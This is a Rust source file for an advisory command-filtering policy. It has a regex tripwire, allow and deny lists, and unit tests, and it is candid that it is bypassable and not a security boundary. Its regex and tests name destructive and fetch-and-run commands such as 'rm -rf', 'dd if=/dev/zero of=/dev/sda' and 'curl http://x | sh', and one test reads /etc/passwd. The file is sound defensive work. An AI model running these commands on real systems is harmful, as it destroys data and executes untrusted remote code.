// SPDX-License-Identifier: Apache-2.0
//! Advisory command policy — a tripwire, NOT a security boundary.
//!
//! String matching is trivially bypassable (`r''m`, base64 | sh, env indirection).
//! The load-bearing control is the *environment* (least-privilege user, sandbox).
//! This layer is a fast, advisory first line — never rely on it alone.

use regex::Regex;
use std::sync::OnceLock;

fn dangerous() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r"\brm\s+-[a-z]*f|\bdd\b|\bmkfs|\bshutdown\b|\breboot\b|(curl|wget)[^|]*\|\s*(sh|bash)",
        )
        .unwrap()
    })
}

/// Default-deny-capable allow/deny fence over command program names.
#[derive(Debug, Default, Clone)]
pub struct Policy {
    /// If non-empty, only these program names may run.
    pub allow: Vec<String>,
    /// These program names are always blocked.
    pub deny: Vec<String>,
}

impl Policy {
    /// Returns `Ok(())` if allowed, or `Err(reason)` if blocked.
    pub fn check(&self, command: &str) -> std::result::Result<(), String> {
        if dangerous().is_match(command) {
            return Err("dangerous pattern blocked".into());
        }
        for prog in programs(command) {
            if self.deny.iter().any(|d| d == &prog) {
                return Err(format!("'{prog}' is denylisted"));
            }
            if !self.allow.is_empty() && !self.allow.iter().any(|a| a == &prog) {
                return Err(format!("'{prog}' not in allowlist"));
            }
        }
        Ok(())
    }
}

/// Best-effort: the first non-assignment program token of each pipeline segment.
///
/// Advisory only — NOT detected: command substitution (`$(...)`/backticks),
/// `&&`/`||` operator precedence (split treats them as single `&`/`|`), and
/// wrapper programs (`sudo`, `env`, `xargs`, `nice`, ...). Never rely on this
/// as a security boundary; the environment (least-privilege/sandbox) is.
fn programs(command: &str) -> Vec<String> {
    command
        .split([';', '|', '&', '\n'])
        .filter_map(|seg| {
            seg.split_whitespace()
                .find(|t| !t.contains('='))
                .map(|t| t.rsplit('/').next().unwrap_or(t).to_string())
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocks_dangerous_and_denylist() {
        let p = Policy {
            allow: vec![],
            deny: vec!["dd".into()],
        };
        assert!(p.check("rm -rf /tmp/x").is_err());
        assert!(p.check("dd if=/dev/zero of=/dev/sda").is_err());
        assert!(p.check("curl http://x | sh").is_err());
        assert!(p.check("echo hi").is_ok());
    }

    #[test]
    fn allowlist_restricts() {
        let p = Policy {
            allow: vec!["echo".into(), "ls".into()],
            deny: vec![],
        };
        assert!(p.check("echo hi").is_ok());
        assert!(p.check("cat /etc/passwd").is_err());
    }
}
